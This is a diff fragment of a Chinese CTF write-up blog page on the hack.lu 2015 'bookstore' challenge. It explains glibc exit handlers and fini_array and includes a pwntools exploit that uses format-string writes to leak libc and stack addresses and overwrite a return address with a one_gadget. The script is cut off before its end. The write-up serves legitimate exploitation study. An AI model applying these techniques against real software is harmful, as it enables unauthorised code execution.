-<h3 id=关于fini_array>关于fini_array</h3>
-<p><code>LIBC_START_MAIN</code>函数在执行完main函数后，执行<code>exit->__run_exit_handlers</code>，在<code>__run_exit_handlers</code>中调用<code>__call_tls_dtors</code>函数和<code>__exit_funcs</code>函数列表，该列表默认情况下只有<code>dl_fini</code>。结构如下</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x40d82</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;one gadget: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>one_gadget</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>one_gadget</span>       <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span>  <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl><span class=n>p4</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>part1</span> <span class=o>=</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl><span class=n>part2</span> <span class=o>=</span> <span class=n>p2</span><span class=o>-</span><span class=n>p1</span> <span class=k>if</span> <span class=n>p2</span> <span class=o>&gt;</span> <span class=n>p1</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p1</span><span class=o>+</span><span class=n>p2</span>
+</span></span><span class=line><span class=cl><span class=n>part3</span> <span class=o>=</span> <span class=n>p3</span><span class=o>-</span><span class=n>p2</span> <span class=k>if</span> <span class=n>p3</span> <span class=o>&gt;</span> <span class=n>p2</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p2</span><span class=o>+</span><span class=n>p3</span>
+</span></span><span class=line><span class=cl><span class=n>part4</span> <span class=o>=</span> <span class=n>p4</span><span class=o>-</span><span class=n>p3</span> <span class=k>if</span> <span class=n>p4</span> <span class=o>&gt;</span> <span class=n>p3</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p3</span><span class=o>+</span><span class=n>p4</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%13$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%14$hhn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%15$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part4</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%16$hhn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>3</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/hack.lu2015%20bookstore/exp.py>exploit</a></p><h3 id=关于fini_array>关于fini_array</h3><p><code>LIBC_START_MAIN</code>函数在执行完main函数后，执行<code>exit->__run_exit_handlers</code>，在<code>__run_exit_handlers</code>中调用<code>__call_tls_dtors</code>函数和<code>__exit_funcs</code>函数列表，该列表默认情况下只有<code>dl_fini</code>。结构如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -400,67 +233,49 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>26
 </span><span class=lnt>27
 </span><span class=lnt>28
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>struct</span> <span class=n>exit_function</span>
-  <span class=p>{</span>
-    <span class=cm>/* `flavour&#39; should be of type of the `enum&#39; above but since we need
-</span><span class=cm>       this element in an atomic operation we have to use `long int&#39;.  */</span>
-    <span class=kt>long</span> <span class=kt>int</span> <span class=n>flavor</span><span class=p>;</span>
-    <span class=k>union</span>
-      <span class=p>{</span>
-	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>at</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span><span class=p>);</span>
-	<span class=k>struct</span>
-	  <span class=p>{</span>
-	    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>fn</span><span class=p>)</span> <span class=p>(</span><span class=kt>int</span> <span class=n>status</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>);</span>
-	    <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>;</span>
-	  <span class=p>}</span> <span class=n>on</span><span class=p>;</span>
-	<span class=k>struct</span>
-	  <span class=p>{</span>
-	    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>fn</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=kt>int</span> <span class=n>status</span><span class=p>);</span>
-	    <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>;</span>
-	    <span class=kt>void</span> <span class=o>*</span><span class=n>dso_handle</span><span class=p>;</span>
-	  <span class=p>}</span> <span class=n>cxa</span><span class=p>;</span>
-      <span class=p>}</span> <span class=n>func</span><span class=p>;</span>
-  <span class=p>};</span>
-
-<span class=k>struct</span> <span class=n>exit_function_list</span>
-  <span class=p>{</span>
-    <span class=k>struct</span> <span class=n>exit_function_list</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
-    <span class=n>size_t</span> <span class=n>idx</span><span class=p>;</span>
-    <span class=k>struct</span> <span class=n>exit_function</span> <span class=n>fns</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
-  <span class=p>};</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705200936606.png alt=image-20200705200936606></p>
-<p>其中idx在第一次遍历此列表时就变为0了，而且就算再将该值改为1，也不会再执行<code>fini_array</code>里的函数。后面再<code>dl_fini</code>里面也貌似有个防范多次执行的变量，可是这块过于复杂了对于我，再看下去势必要花不少时间且偏离方向了，日后再说吧。。。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>exit_function</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/* `flavour&#39; should be of type of the `enum&#39; above but since we need
+</span></span></span><span class=line><span class=cl><span class=cm>       this element in an atomic operation we have to use `long int&#39;.  */</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>int</span> <span class=n>flavor</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>union</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>at</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span>
+</span></span><span class=line><span class=cl>	  <span class=p>{</span>
+</span></span><span class=line><span class=cl>	    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>fn</span><span class=p>)</span> <span class=p>(</span><span class=kt>int</span> <span class=n>status</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	    <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	  <span class=p>}</span> <span class=n>on</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span>
+</span></span><span class=line><span class=cl>	  <span class=p>{</span>
+</span></span><span class=line><span class=cl>	    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>fn</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=kt>int</span> <span class=n>status</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	    <span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	    <span class=kt>void</span> <span class=o>*</span><span class=n>dso_handle</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	  <span class=p>}</span> <span class=n>cxa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=n>func</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>exit_function_list</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>exit_function_list</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>exit_function</span> <span class=n>fns</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705200936606.png alt=image-20200705200936606></p><p>其中idx在第一次遍历此列表时就变为0了，而且就算再将该值改为1，也不会再执行<code>fini_array</code>里的函数。后面再<code>dl_fini</code>里面也貌似有个防范多次执行的变量，可是这块过于复杂了对于我，再看下去势必要花不少时间且偏离方向了，日后再说吧。。。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// glibc release/2.26/master elf/dl-fini.c _dl_fini(void)
-</span><span class=c1></span>
-<span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_init_called</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=cm>/* Make sure nothing happens if we are called twice.  */</span>
-    <span class=n>l</span><span class=o>-&gt;</span><span class=n>l_init_called</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
-    <span class=p>...</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>struct exit_function</code>里存储的指针也经过了指针加密？。</p>
-<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705202457594.png alt=image-20200705202457594></p>
-<h2 id=exploit>exploit</h2>
-<p><a href=https://github.com/clxsh/ctf_wps/blob/master/heap/hack.lu2015%20bookstore/exp.py>exp</a></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// glibc release/2.26/master elf/dl-fini.c _dl_fini(void)
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_init_called</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/* Make sure nothing happens if we are called twice.  */</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>-&gt;</span><span class=n>l_init_called</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>struct exit_function</code>里存储的指针也经过了指针加密？。</p><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705202457594.png alt=image-20200705202457594></p><h2 id=exploit>exploit</h2><p><a href=https://github.com/clxsh/ctf_wps/blob/master/heap/hack.lu2015%20bookstore/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
 </span><span class=lnt>  2
 </span><span class=lnt>  3
 </span><span class=lnt>  4
@@ -566,190 +381,129 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>104
 </span><span class=lnt>105
 </span><span class=lnt>106
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
-
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-
-<span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;info&#34;</span><span class=p>)</span>
-<span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./bookstore&#34;</span>
-<span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&#34;</span>
-
-<span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;5: Submit</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
-
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
-    <span class=n>fini_array</span> <span class=o>=</span> <span class=mh>0x6011B8</span>
-    <span class=n>puts_got</span>   <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
-    <span class=n>free_got</span>   <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;free&#34;</span><span class=p>]</span>
-
-    <span class=c1># phase 1</span>
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
-
-    <span class=c1># format string: overwrite fini_arrary with start, leak libc and stack</span>
-    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=si>%1920x</span><span class=s2>%13$hn...%14$s,,,%28$llx&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-    <span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fini_array</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>))</span>
-
-    <span class=c1># leak libc and stack</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
-    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;,,,&#34;</span><span class=p>)</span>
-    <span class=n>stack_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>12</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
-
-    <span class=n>ret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0x288</span>
-    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
-
-<span class=c1>#########################################################</span>
-<span class=c1>#   fail when part1 + part2 is too big (possible reason...</span>
-<span class=c1>#########################################################</span>
-    <span class=c1># one_gadget = libc_base + 0x40d82</span>
-    <span class=c1># part1 =  one_gadget      % (1&lt;&lt;16)</span>
-    <span class=c1># part2 = (one_gadget&gt;&gt;16) % (1&lt;&lt;16)</span>
-    <span class=c1># log.debug(&#34;0x%x&#34; % part1)</span>
-    <span class=c1># log.debug(&#34;0x%x&#34; % part2)</span>
-    <span class=c1># if part2 &gt; part1:</span>
-    <span class=c1>#     part2 = part2 - part1</span>
-    <span class=c1># else:</span>
-    <span class=c1>#     part2 = part2 + ((1&lt;&lt;16)-part1)</span>
-
-    <span class=c1># log.debug(&#34;0x%x&#34; % part1)</span>
-    <span class=c1># log.debug(&#34;0x%x&#34; % part2)</span>
-
-    <span class=c1># log.debug(&#34;ret addr: 0x%x&#34; % ret_addr)</span>
-    <span class=c1># log.debug(&#34;one gadget: 0x%x&#34; % one_gadget)</span>
-    
-    <span class=c1># # phase 2</span>
-    <span class=c1># menu(b&#39;4&#39;)</span>
-    <span class=c1># payload = b&#34;%&#34; + str(part1).encode(&#34;ascii&#34;) + b&#34;x%13$hn&#34; + b&#34;%&#34; + str(part2).encode(&#34;ascii&#34;) + b&#34;x%14$hn&#34;</span>
-    <span class=c1># payload = payload.ljust(0x90-28, b&#34;A&#34;).ljust(0x88, b&#34;\x00&#34;) + p64(0x151)</span>
-    <span class=c1># menu(b&#34;1&#34;)</span>
-    <span class=c1># io.sendline(payload)</span>
-    <span class=c1># # gdb.attach(io, &#34;b *0x400B09&#34;)</span>
-    <span class=c1># menu(b&#34;5&#34; + p8(0x1)*7 + p64(ret_addr) + p64(ret_addr+2))</span>
-
-    <span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x40d82</span>
-    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;one gadget: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>one_gadget</span><span class=p>)</span>
-    <span class=n>p1</span> <span class=o>=</span> <span class=n>one_gadget</span>       <span class=o>&amp;</span> <span class=mh>0xff</span>
-    <span class=n>p2</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span>  <span class=o>&amp;</span> <span class=mh>0xff</span>
-    <span class=n>p3</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
-    <span class=n>p4</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
-
-    <span class=n>part1</span> <span class=o>=</span> <span class=n>p1</span>
-    <span class=n>part2</span> <span class=o>=</span> <span class=n>p2</span><span class=o>-</span><span class=n>p1</span> <span class=k>if</span> <span class=n>p2</span> <span class=o>&gt;</span> <span class=n>p1</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p1</span><span class=o>+</span><span class=n>p2</span>
-    <span class=n>part3</span> <span class=o>=</span> <span class=n>p3</span><span class=o>-</span><span class=n>p2</span> <span class=k>if</span> <span class=n>p3</span> <span class=o>&gt;</span> <span class=n>p2</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p2</span><span class=o>+</span><span class=n>p3</span>
-    <span class=n>part4</span> <span class=o>=</span> <span class=n>p4</span><span class=o>-</span><span class=n>p3</span> <span class=k>if</span> <span class=n>p4</span> <span class=o>&gt;</span> <span class=n>p3</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p3</span><span class=o>+</span><span class=n>p4</span>
-
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
-    <span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%13$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%14$hhn&#34;</span>
-    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%15$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part4</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%16$hhn&#34;</span>
-    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-    <span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
-    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>3</span><span class=p>))</span>
-
-    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-
-
-
-
-<span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
-<span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
-    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-<span class=k>else</span><span class=p>:</span>
-    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
-        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
-    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
